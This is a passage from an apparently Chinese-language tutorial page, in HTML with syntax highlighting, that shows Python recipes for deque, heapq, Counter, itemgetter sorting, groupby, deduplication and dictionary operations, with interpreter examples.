class="string">'15888888888'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>*front,end = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>front</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>end</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><h3 id="保留有限历史记录"><a href="#保留有限历史记录" class="headerlink" title="保留有限历史记录"></a>保留有限历史记录</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q = deque(maxlen=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], maxlen=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], maxlen=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><code>deque</code>增删操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>q = deque()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.appendleft(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.pop()</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.popleft()</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">1</span>, <span class="number">2</span>])</span><br></pre></td></tr></table></figure><h4 id="查找最大或最小的N个元素"><a href="#查找最大或最小的N个元素" class="headerlink" title="查找最大或最小的N个元素"></a>查找最大或最小的N个元素</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> heapq</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>heapq.nlargest(<span class="number">3</span>,nums)</span><br><span class="line">[<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>heapq.nsmallest(<span class="number">3</span>,nums)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>处理更复杂的的数据结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>portfolio = [</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'IBM'</span>, <span class="string">'shares'</span>: <span class="number">100</span>, <span class="string">'price'</span>: <span class="number">91.1</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'AAPL'</span>, <span class="string">'shares'</span>: <span class="number">50</span>, <span class="string">'price'</span>: <span class="number">543.22</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'FB'</span>, <span class="string">'shares'</span>: <span class="number">200</span>, <span class="string">'price'</span>: <span class="number">21.09</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'HPQ'</span>, <span class="string">'shares'</span>: <span class="number">35</span>, <span class="string">'price'</span>: <span class="number">31.75</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'YHOO'</span>, <span class="string">'shares'</span>: <span class="number">45</span>, <span class="string">'price'</span>: <span class="number">16.35</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'ACME'</span>, <span class="string">'shares'</span>: <span class="number">75</span>, <span class="string">'price'</span>: <span class="number">115.65</span>&#125;</span><br><span class="line"><span class="meta">... </span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cheap = heapq.nsmallest(<span class="number">3</span>, portfolio, key=<span class="keyword">lambda</span> s: s[<span class="string">'price'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cheap</span><br><span class="line">[&#123;<span class="string">'name'</span>: <span class="string">'YHOO'</span>, <span class="string">'shares'</span>: <span class="number">45</span>, <span class="string">'price'</span>: <span class="number">16.35</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'FB'</span>, <span class="string">'shares'</span>: <span class="number">200</span>, <span class="string">'price'</span>: <span class="number">21.09</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'HPQ'</span>, <span class="string">'shares'</span>: <span class="number">35</span>, <span class="string">'price'</span>: <span class="number">31.75</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>expensive = heapq.nlargest(<span class="number">3</span>, portfolio, key=<span class="keyword">lambda</span> s: s[<span class="string">'price'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>expensive</span><br><span class="line">[&#123;<span class="string">'name'</span>: <span class="string">'AAPL'</span>, <span class="string">'shares'</span>: <span class="number">50</span>, <span class="string">'price'</span>: <span class="number">543.22</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'ACME'</span>, <span class="string">'shares'</span>: <span class="number">75</span>, <span class="string">'price'</span>: <span class="number">115.65</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'IBM'</span>, <span class="string">'shares'</span>: <span class="number">100</span>, <span class="string">'price'</span>: <span class="number">91.1</span>&#125;]</span><br></pre></td></tr></table></figure><h4 id="字典运算"><a href="#字典运算" class="headerlink" title="字典运算"></a>字典运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>prices = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'ACME'</span>: <span class="number">45.23</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'AAPL'</span>: <span class="number">612.78</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'IBM'</span>: <span class="number">205.55</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'HPQ'</span>: <span class="number">37.20</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'FB'</span>: <span class="number">10.75</span></span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>min_price = min(zip(prices.values(),prices.keys()))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>min_price</span><br><span class="line">(<span class="number">10.75</span>, <span class="string">'FB'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>max_price = max(zip(prices.values(),prices.keys()))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>max_price</span><br><span class="line">(<span class="number">612.78</span>, <span class="string">'AAPL'</span>)</span><br></pre></td></tr></table></figure><h4 id="查找两字典的相同点"><a href="#查找两字典的相同点" class="headerlink" title="查找两字典的相同点"></a>查找两字典的相同点</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'x'</span> : <span class="number">1</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'y'</span> : <span class="number">2</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'z'</span> : <span class="number">3</span></span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'w'</span> : <span class="number">10</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'x'</span> : <span class="number">11</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'y'</span> : <span class="number">2</span></span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.keys() &amp; b.keys()</span><br><span class="line">&#123;<span class="string">'y'</span>, <span class="string">'x'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.items() &amp; b.items()</span><br><span class="line">&#123;(<span class="string">'y'</span>, <span class="number">2</span>)&#125;</span><br></pre></td></tr></table></figure><h4 id="删除序列相同元素并保持顺序"><a href="#删除序列相同元素并保持顺序" class="headerlink" title="删除序列相同元素并保持顺序"></a>删除序列相同元素并保持顺序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dedupe</span><span class="params">(items)</span>:</span></span><br><span class="line">    seen = set()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">            seen.add(item)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(dedupe(a))</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dedupe</span><span class="params">(items, key=None)</span>:</span></span><br><span class="line">    seen = set()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        val = item <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> key(item)</span><br><span class="line">        <span class="keyword">if</span> val <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">            seen.add(val)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [ &#123;<span class="string">'x'</span>:<span class="number">1</span>, <span class="string">'y'</span>:<span class="number">2</span>&#125;, &#123;<span class="string">'x'</span>:<span class="number">1</span>, <span class="string">'y'</span>:<span class="number">3</span>&#125;, &#123;<span class="string">'x'</span>:<span class="number">1</span>, <span class="string">'y'</span>:<span class="number">2</span>&#125;, &#123;<span class="string">'x'</span>:<span class="number">2</span>, <span class="string">'y'</span>:<span class="number">4</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(dedupe(a, key=<span class="keyword">lambda</span> d: (d[<span class="string">'x'</span>],d[<span class="string">'y'</span>])))</span><br><span class="line">[&#123;<span class="string">'x'</span>: <span class="number">1</span>, <span class="string">'y'</span>: <span class="number">2</span>&#125;, &#123;<span class="string">'x'</span>: <span class="number">1</span>, <span class="string">'y'</span>: <span class="number">3</span>&#125;, &#123;<span class="string">'x'</span>: <span class="number">2</span>, <span class="string">'y'</span>: <span class="number">4</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(dedupe(a, key=<span class="keyword">lambda</span> d: d[<span class="string">'x'</span>]))</span><br><span class="line">[&#123;<span class="string">'x'</span>: <span class="number">1</span>, <span class="string">'y'</span>: <span class="number">2</span>&#125;, &#123;<span class="string">'x'</span>: <span class="number">2</span>, <span class="string">'y'</span>: <span class="number">4</span>&#125;]</span><br></pre></td></tr></table></figure><h4 id="序列中出现次数最多的元素"><a href="#序列中出现次数最多的元素" class="headerlink" title="序列中出现次数最多的元素"></a>序列中出现次数最多的元素</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>words = [</span><br><span class="line"><span class="meta">... </span>    <span class="string">'look'</span>, <span class="string">'into'</span>, <span class="string">'my'</span>, <span class="string">'eyes'</span>, <span class="string">'look'</span>, <span class="string">'into'</span>, <span class="string">'my'</span>, <span class="string">'eyes'</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'the'</span>, <span class="string">'eyes'</span>, <span class="string">'the'</span>, <span class="string">'eyes'</span>, <span class="string">'the'</span>, <span class="string">'eyes'</span>, <span class="string">'not'</span>, <span class="string">'around'</span>, <span class="string">'the'</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'eyes'</span>, <span class="string">"don't"</span>, <span class="string">'look'</span>, <span class="string">'around'</span>, <span class="string">'the'</span>, <span class="string">'eyes'</span>, <span class="string">'look'</span>, <span class="string">'into'</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'my'</span>, <span class="string">'eyes'</span>, <span class="string">"you're"</span>, <span class="string">'under'</span></span><br><span class="line"><span class="meta">... </span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>word_counts = Counter(words)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>top_three = word_counts.most_common(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>top_three</span><br><span class="line">[(<span class="string">'eyes'</span>, <span class="number">8</span>), (<span class="string">'the'</span>, <span class="number">5</span>), (<span class="string">'look'</span>, <span class="number">4</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>word_counts[<span class="string">'not'</span>]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>word_counts[<span class="string">'eyes'</span>]</span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure><h4 id="通过某个关键字排序字典列表"><a href="#通过某个关键字排序字典列表" class="headerlink" title="通过某个关键字排序字典列表"></a>通过某个关键字排序字典列表</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows = [</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'fname'</span>: <span class="string">'Brian'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1003</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'fname'</span>: <span class="string">'David'</span>, <span class="string">'lname'</span>: <span class="string">'Beazley'</span>, <span class="string">'uid'</span>: <span class="number">1002</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'fname'</span>: <span class="string">'John'</span>, <span class="string">'lname'</span>: <span class="string">'Cleese'</span>, <span class="string">'uid'</span>: <span class="number">1001</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'fname'</span>: <span class="string">'Big'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1004</span>&#125;</span><br><span class="line"><span class="meta">... </span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows_by_fname = sorted(rows,key=itemgetter(<span class="string">'fname'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows_by_fname</span><br><span class="line">[&#123;<span class="string">'fname'</span>: <span class="string">'Big'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1004</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'Brian'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1003</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'David'</span>, <span class="string">'lname'</span>: <span class="string">'Beazley'</span>, <span class="string">'uid'</span>: <span class="number">1002</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'John'</span>, <span class="string">'lname'</span>: <span class="string">'Cleese'</span>, <span class="string">'uid'</span>: <span class="number">1001</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows_by_uid = sorted(rows,key=itemgetter(<span class="string">'uid'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows_by_uid</span><br><span class="line">[&#123;<span class="string">'fname'</span>: <span class="string">'John'</span>, <span class="string">'lname'</span>: <span class="string">'Cleese'</span>, <span class="string">'uid'</span>: <span class="number">1001</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'David'</span>, <span class="string">'lname'</span>: <span class="string">'Beazley'</span>, <span class="string">'uid'</span>: <span class="number">1002</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'Brian'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1003</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'Big'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1004</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>min(rows,key=itemgetter(<span class="string">'uid'</span>))</span><br><span class="line">&#123;<span class="string">'fname'</span>: <span class="string">'John'</span>, <span class="string">'lname'</span>: <span class="string">'Cleese'</span>, <span class="string">'uid'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>max(rows,key=itemgetter(<span class="string">'uid'</span>))</span><br><span class="line">&#123;<span class="string">'fname'</span>: <span class="string">'Big'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1004</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="通过某个字段将记录分组"><a href="#通过某个字段将记录分组" class="headerlink" title="通过某个字段将记录分组"></a>通过某个字段将记录分组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows = [</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'5412 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/01/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'5148 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/04/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'5800 E 58TH'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'2122 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/03/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'5645 N RAVENSWOOD'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'1060 W ADDISON'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'4801 N BROADWAY'</span>, <span class="string">'date'</span>: <span class="string">'07/01/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'1039 W GRANVILLE'</span>, <span class="string">'date'</span>: <span class="string">'07/04/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows.sort(key=itemgetter(<span class="string">'date'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> date,items <span class="keyword">in</span> groupby(rows,key=itemgetter(<span class="string">'date'</span>)):</span><br><span class="line"><span class="meta">... </span>    print(date)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> i <span class="keyword">in</span> items:</span><br><span class="line"><span class="meta">... </span>            print(<span class="string">' '</span>,i)</span><br><span class="line">...</span><br><span class="line"><span class="number">07</span>/<span class="number">01</span>/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'5412 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/01/2012'</span>&#125;</span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'4801 N BROADWAY'</span>, <span class="string">'date'</span>: <span class="string">'07/01/2012'</span>&#125;</span><br><span class="line"><span class="number">07</span>/<span class="number">02</span>/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'5800 E 58TH'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;</span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'5645 N RAVENSWOOD'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;</span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'1060 W ADDISON'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;</span><br><span class="line"><span class="number">07</span>/<span class="number">03</span>/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'2122 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/03/2012'</span>&#125;</span><br><span class="line"><span class="number">07</span>/<span class="number">04</span>/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'5148 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/04/2012'</span>&#125;</span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'1039 W GRANVILLE'</span>, <span class="string">'date'</span>: <span class="string">'07/04/2012'</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="过滤列表元素"><a href="#过滤列表元素" class="headerlink" title="过滤列表元素"></a>过滤列表元素</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">values = [<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'-3'</span>, <span class="string">'-'</span>, <span class="string">'4'</span>, <span class="string">'N/A'</span>, <span class="string">'5'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_int</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = int(val)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">ivals = list(filter(is_int, values))</span><br><span class="line">print(ivals)</span><br><span class="line"><span class="comment"># Outputs ['1', '2', '-3', '4', '5']</span></span><br></pre></td></tr></table></figure><h4 id="从字典中提取子集"><a href="#从字典中提取子集" class="headerlink" title="从字典中提取子集"></a>从字典中提取子集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>prices = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'ACME'</span>: <span class="number">45.23</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'AAPL'</span>: <span class="number">612.78</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'IBM'</span>: <span class="number">205.55</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'HPQ'</span>: <span class="number">37.20</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'FB'</span>: <span class="number">10.75</span></span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1 = dict((key, value) <span class="keyword">for</span> key, value <span class="keyword">in</span> prices.items() <span class="keyword">if</span> value &gt; <span class="number">200</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1</span><br><span class="line">&#123;<span class="string">'AAPL'</span>: <span class="number">612.78</span>, <span class="string">'IBM'</span>: <span class="number">205.55</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="合并多个字典或映射"><a 